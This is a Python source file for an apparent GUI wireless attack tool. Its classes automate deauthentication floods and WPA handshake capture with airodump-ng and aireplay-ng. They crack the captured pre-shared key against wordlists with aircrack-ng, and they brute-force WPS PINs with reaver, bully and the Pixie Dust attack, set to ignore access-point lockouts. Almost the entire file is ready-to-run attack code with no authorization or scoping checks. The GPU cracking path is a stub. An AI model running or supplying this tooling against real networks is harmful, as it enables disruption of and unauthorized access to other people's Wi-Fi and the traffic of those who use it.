"""
Attack Engine
Automated wireless network attack and key recovery
"""

import subprocess
import os
import time
import re
from pathlib import Path
from typing import Optional, Tuple, Dict
from PyQt6.QtCore import QThread, pyqtSignal
from datetime import datetime


class HandshakeCapturer(QThread):
    """Capture WPA/WPA2 handshakes"""

    progress_updated = pyqtSignal(int, str)  # percentage, message
    handshake_captured = pyqtSignal(str, str, str)  # ssid, bssid, capture_file
    error_occurred = pyqtSignal(str)
    finished = pyqtSignal(bool, str)  # success, message

    def __init__(self, interface: str, bssid: str, channel: str, ssid: str = None, timeout: int = 300):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.ssid = ssid or "Unknown"
        self.timeout = timeout
        self.running = False
        self.capture_dir = Path.cwd() / "data" / "captures" / "handshakes"
        self.capture_dir.mkdir(parents=True, exist_ok=True)

    def run(self):
        """Run handshake capture"""
        self.running = True

        try:
            # Generate capture filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_ssid = re.sub(r'[^\w\-_]', '_', self.ssid)
            capture_file = self.capture_dir / f"hs_{safe_ssid}_{self.bssid.replace(':', '-')}_{timestamp}"

            self.progress_updated.emit(5, f"Starting capture on {self.interface}")

            # Start airodump-ng to capture handshake
            airodump_cmd = [
                'airodump-ng',
                '--bssid', self.bssid,
                '--channel', self.channel,
                '--write', str(capture_file),
                '--output-format', 'pcap',
                self.interface
            ]

            self.progress_updated.emit(10, f"Monitoring {self.ssid} on channel {self.channel}")
            print(f"[*] Starting handshake capture: {' '.join(airodump_cmd)}")

            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait a moment for airodump to start
            time.sleep(2)

            # Send deauth packets to force handshake
            self.progress_updated.emit(20, "Sending deauth packets...")
            deauth_count = 0
            max_deauth_rounds = 3

            for round_num in range(max_deauth_rounds):
                if not self.running:
                    break

                aireplay_cmd = [
                    'aireplay-ng',
                    '--deauth', '10',  # Send 10 deauth packets
                    '-a', self.bssid,
                    self.interface
                ]

                print(f"[*] Deauth round {round_num + 1}/{max_deauth_rounds}: {' '.join(aireplay_cmd)}")

                try:
                    subprocess.run(aireplay_cmd, timeout=5, capture_output=True)
                    deauth_count += 10
                    progress = min(20 + (round_num + 1) * 20, 80)
                    self.progress_updated.emit(progress, f"Deauth packets sent: {deauth_count}")
                except subprocess.TimeoutExpired:
                    pass

                # Wait between rounds
                time.sleep(3)

            # Give time for handshake capture
            self.progress_updated.emit(85, "Waiting for handshake...")
            time.sleep(5)

            # Stop airodump
            airodump_process.terminate()
            airodump_process.wait(timeout=5)

            # Check if handshake was captured
            cap_file = Path(str(capture_file) + "-01.cap")
            if not cap_file.exists():
                self.finished.emit(False, f"Capture file not created: {cap_file}")
                return

            # Use aircrack-ng to verify handshake
            self.progress_updated.emit(90, "Verifying handshake...")
            verify_cmd = ['aircrack-ng', str(cap_file)]

            try:
                result = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr

                # Check for handshake in output
                if 'handshake' in output.lower() or '1 handshake' in output.lower():
                    self.progress_updated.emit(100, "✅ Handshake captured!")
                    self.handshake_captured.emit(self.ssid, self.bssid, str(cap_file))
                    self.finished.emit(True, f"Handshake captured: {cap_file}")
                else:
                    self.finished.emit(False, "No handshake found in capture")
            except subprocess.TimeoutExpired:
                self.finished.emit(False, "Handshake verification timed out")

        except Exception as e:
            self.error_occurred.emit(str(e))
            self.finished.emit(False, f"Error: {e}")

    def stop(self):
        """Stop capture"""
        self.running = False


class PSKCracker(QThread):
    """Crack WPA/WPA2 PSK from handshake"""

    progress_updated = pyqtSignal(int, str)  # percentage, message
    key_recovered = pyqtSignal(str, str, str)  # ssid, bssid, key
    error_occurred = pyqtSignal(str)
    finished = pyqtSignal(bool, str)  # success, message

    def __init__(self, capture_file: str, ssid: str, bssid: str, wordlist: str = None, use_gpu: bool = False):
        super().__init__()
        self.capture_file = capture_file
        self.ssid = ssid
        self.bssid = bssid
        self.use_gpu = use_gpu
        self.running = False

        # Default wordlists
        if not wordlist:
            possible_wordlists = [
                '/usr/share/wordlists/rockyou.txt',
                '/usr/share/dict/words',
                str(Path.cwd() / 'data' / 'wordlists' / 'common-passwords.txt')
            ]
            for wl in possible_wordlists:
                if Path(wl).exists():
                    self.wordlist = wl
                    break
            else:
                self.wordlist = None
        else:
            self.wordlist = wordlist

    def run(self):
        """Run PSK cracking"""
        self.running = True

        if not self.wordlist:
            self.finished.emit(False, "No wordlist available")
            return

        try:
            self.progress_updated.emit(5, f"Starting crack with {Path(self.wordlist).name}")

            if self.use_gpu:
                # Try hashcat for GPU acceleration
                success, key = self._crack_with_hashcat()
            else:
                # Use aircrack-ng (CPU)
                success, key = self._crack_with_aircrack()

            if success and key:
                self.progress_updated.emit(100, f"✅ Key recovered: {key}")
                self.key_recovered.emit(self.ssid, self.bssid, key)
                self.finished.emit(True, f"Key: {key}")
            else:
                self.finished.emit(False, "Key not found in wordlist")

        except Exception as e:
            self.error_occurred.emit(str(e))
            self.finished.emit(False, f"Error: {e}")

    def _crack_with_aircrack(self) -> Tuple[bool, Optional[str]]:
        """Crack with aircrack-ng"""
        self.progress_updated.emit(10, "Cracking with aircrack-ng...")

        cmd = [
            'aircrack-ng',
            '-w', self.wordlist,
            '-b', self.bssid,
            self.capture_file
        ]

        print(f"[*] Cracking: {' '.join(cmd)}")

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Monitor progress
        key_pattern = re.compile(r'KEY FOUND! \[ (.*?) \]')
        progress_pattern = re.compile(r'(\d+)/(\d+) keys tested')

        while self.running:
            line = process.stdout.readline()
            if not line:
                break

            # Check for key
            key_match = key_pattern.search(line)
            if key_match:
                key = key_match.group(1)
                process.terminate()
                return True, key

            # Update progress
            prog_match = progress_pattern.search(line)
            if prog_match:
                tested = int(prog_match.group(1))
                total = int(prog_match.group(2))
                percentage = min(int((tested / total) * 100), 95)
                self.progress_updated.emit(percentage, f"Testing: {tested:,}/{total:,} keys")

        process.terminate()
        return False, None

    def _crack_with_hashcat(self) -> Tuple[bool, Optional[str]]:
        """Crack with hashcat (GPU acceleration)"""
        # Convert cap to hccapx format first
        # This is a placeholder - full implementation would require hcxpcaptool
        self.progress_updated.emit(50, "GPU cracking not yet fully implemented")
        return False, None

    def stop(self):
        """Stop cracking"""
        self.running = False


class WPSAttacker(QThread):
    """Attack WPS-enabled networks using Reaver with multiple strategies"""

    progress_updated = pyqtSignal(int, str)
    pin_found = pyqtSignal(str, str, str, str)  # ssid, bssid, pin, psk
    error_occurred = pyqtSignal(str)
    finished = pyqtSignal(bool, str)

    def __init__(self, interface: str, bssid: str, channel: str = None, ssid: str = None, timeout: int = 300):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.ssid = ssid or "Unknown"
        self.timeout = timeout
        self.running = False
        self.start_time = None

    def run(self):
        """Run WPS attack using reaver with multiple strategies"""
        self.running = True
        self.start_time = time.time()

        try:
            self.progress_updated.emit(5, "Starting WPS attack with reaver...")

            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.bssid,
                '-vv',
                '-N',  # Don't send NACK messages
                '-L',  # Ignore locked state
                '-d', '2',  # Delay between PIN attempts (2 seconds)
                '-T', '0.5',  # Timeout period waiting for response (0.5 sec)
                '-t', '15',  # Max time for each attempt (15 sec)
                '-x', '3',  # Max failures before backoff (3)
            ]

            # Add channel if provided
            if self.channel:
                cmd.extend(['-c', self.channel])

            print(f"[*] WPS Attack (Reaver): {' '.join(cmd)}")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            pin_pattern = re.compile(r'WPS PIN: \'(\d+)\'')
            psk_pattern = re.compile(r'WPA PSK: \'(.+?)\'')

            wps_pin = None
            wpa_psk = None
            attempts = 0

            while self.running:
                # Check timeout
                if time.time() - self.start_time > self.timeout:
                    process.terminate()
                    self.finished.emit(False, f"Attack timed out after {self.timeout} seconds")
                    return

                line = process.stdout.readline()
                if not line:
                    break

                print(f"[REAVER] {line.strip()}")

                # Check for PIN
                pin_match = pin_pattern.search(line)
                if pin_match:
                    wps_pin = pin_match.group(1)
                    self.progress_updated.emit(90, f"WPS PIN found: {wps_pin}")

                # Check for PSK
                psk_match = psk_pattern.search(line)
                if psk_match:
                    wpa_psk = psk_match.group(1)
                    self.progress_updated.emit(100, f"✅ PSK recovered: {wpa_psk}")
                    self.pin_found.emit(self.ssid, self.bssid, wps_pin or "Unknown", wpa_psk)
                    process.terminate()
                    self.finished.emit(True, f"PIN: {wps_pin}, PSK: {wpa_psk}")
                    return

                # Check for locked state
                if 'WARNING: Detected AP rate limiting' in line or 'WPS locked' in line.lower():
                    self.progress_updated.emit(50, "⚠️ AP rate limiting detected - slowing down")

                # Track attempts
                if 'Trying pin' in line:
                    attempts += 1
                    elapsed = int(time.time() - self.start_time)
                    if attempts % 10 == 0:
                        progress = min(10 + (attempts // 10), 85)
                        self.progress_updated.emit(progress, f"Attempt {attempts} ({elapsed}s elapsed)")

            process.terminate()
            self.finished.emit(False, "WPS attack completed without success")

        except Exception as e:
            self.error_occurred.emit(str(e))
            self.finished.emit(False, f"Error: {e}")

    def stop(self):
        """Stop WPS attack"""
        self.running = False


class BullyAttacker(QThread):
    """Attack WPS-enabled networks using Bully"""

    progress_updated = pyqtSignal(int, str)
    pin_found = pyqtSignal(str, str, str, str)  # ssid, bssid, pin, psk
    error_occurred = pyqtSignal(str)
    finished = pyqtSignal(bool, str)

    def __init__(self, interface: str, bssid: str, ssid: str = None, timeout: int = 300):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid or "Unknown"
        self.timeout = timeout
        self.running = False

    def run(self):
        """Run WPS attack using bully"""
        self.running = True

        try:
            self.progress_updated.emit(5, "Starting WPS attack with bully...")

            cmd = [
                'bully',
                '-b', self.bssid,
                '-c', '11',  # Channel (will be auto-detected)
                '-v', '3',   # Verbosity level
                '-L',        # Ignore locked state
                '-F',        # Force continue on failures
                self.interface
            ]

            print(f"[*] Bully Attack: {' '.join(cmd)}")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            pin_pattern = re.compile(r'Pin is \'(\d+)\'')
            psk_pattern = re.compile(r'KEY1 is \'(.+?)\'')

            wps_pin = None
            wpa_psk = None
            attempts = 0

            while self.running:
                line = process.stdout.readline()
                if not line:
                    break

                print(f"[BULLY] {line.strip()}")

                # Check for PIN
                pin_match = pin_pattern.search(line)
                if pin_match:
                    wps_pin = pin_match.group(1)
                    self.progress_updated.emit(90, f"WPS PIN found: {wps_pin}")

                # Check for PSK
                psk_match = psk_pattern.search(line)
                if psk_match:
                    wpa_psk = psk_match.group(1)
                    self.progress_updated.emit(100, f"✅ PSK recovered: {wpa_psk}")
                    self.pin_found.emit(self.ssid, self.bssid, wps_pin or "Unknown", wpa_psk)
                    process.terminate()
                    self.finished.emit(True, f"PIN: {wps_pin}, PSK: {wpa_psk}")
                    return

                # Track attempts
                if 'Pin attempt' in line or 'Trying pin' in line:
                    attempts += 1
                    if attempts % 10 == 0:
                        progress = min(10 + (attempts // 10), 85)
                        self.progress_updated.emit(progress, f"Attempt {attempts}")

            process.terminate()
            self.finished.emit(False, "Bully attack completed without success")

        except Exception as e:
            self.error_occurred.emit(str(e))
            self.finished.emit(False, f"Error: {e}")

    def stop(self):
        """Stop Bully attack"""
        self.running = False


class PixieWPSAttacker(QThread):
    """Fast WPS Pixie Dust attack - exploits weak random number generation"""

    progress_updated = pyqtSignal(int, str)
    pin_found = pyqtSignal(str, str, str, str)  # ssid, bssid, pin, psk
    error_occurred = pyqtSignal(str)
    finished = pyqtSignal(bool, str)

    def __init__(self, interface: str, bssid: str, channel: str = None, ssid: str = None):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.ssid = ssid or "Unknown"
        self.running = False

    def run(self):
        """Run Pixie Dust attack - very fast WPS attack"""
        self.running = True

        try:
            self.progress_updated.emit(10, "Starting Pixie Dust attack...")

            # Build reaver command with pixie dust mode
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.bssid,
                '-K', '1',  # Enable Pixie Dust attack
                '-vv',
                '-L',  # Ignore locked state
                '-N',  # No NACK
            ]

            # Add channel if provided
            if self.channel:
                cmd.extend(['-c', self.channel])

            print(f"[*] Pixie Dust Attack: {' '.join(cmd)}")
            self.progress_updated.emit(20, "Attempting Pixie Dust attack...")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # Patterns to detect success
            pin_pattern = re.compile(r'WPS PIN: \'(\d+)\'')
            psk_pattern = re.compile(r'WPA PSK: \'(.+?)\'')
            pixie_success = re.compile(r'Pixie.*success|PKE.*PKR.*found', re.IGNORECASE)

            wps_pin = None
            wpa_psk = None
            pixie_mode_active = False

            # Pixie dust is usually very fast (under 1 minute)
            timeout = time.time() + 120  # 2 minutes max

            while self.running and time.time() < timeout:
                line = process.stdout.readline()
                if not line:
                    break

                print(f"[PIXIE] {line.strip()}")

                # Check if pixie mode activated
                if pixie_success.search(line):
                    pixie_mode_active = True
                    self.progress_updated.emit(60, "✨ Pixie Dust mode active - analyzing...")

                # Check for PIN
                pin_match = pin_pattern.search(line)
                if pin_match:
                    wps_pin = pin_match.group(1)
                    self.progress_updated.emit(90, f"✨ WPS PIN found via Pixie Dust: {wps_pin}")

                # Check for PSK
                psk_match = psk_pattern.search(line)
                if psk_match:
                    wpa_psk = psk_match.group(1)
                    self.progress_updated.emit(100, f"✅ PSK recovered: {wpa_psk}")
                    self.pin_found.emit(self.ssid, self.bssid, wps_pin or "Unknown", wpa_psk)
                    process.terminate()
                    self.finished.emit(True, f"Pixie Dust Success! PIN: {wps_pin}, PSK: {wpa_psk}")
                    return

                # Check for failure indicators
                if 'not vulnerable' in line.lower() or 'pixie.*failed' in line.lower():
                    process.terminate()
                    self.finished.emit(False, "AP not vulnerable to Pixie Dust attack")
                    return

                # Progress indication
                if 'Trying pin' in line or 'Sending' in line:
                    self.progress_updated.emit(50, "Testing WPS vulnerability...")

            process.terminate()

            if pixie_mode_active and wps_pin:
                # Found PIN but not PSK
                self.finished.emit(True, f"Pixie Dust found PIN: {wps_pin}")
            else:
                self.finished.emit(False, "Pixie Dust attack unsuccessful")

        except Exception as e:
            self.error_occurred.emit(str(e))
            self.finished.emit(False, f"Error: {e}")

    def stop(self):
        """Stop Pixie Dust attack"""
        self.running = False
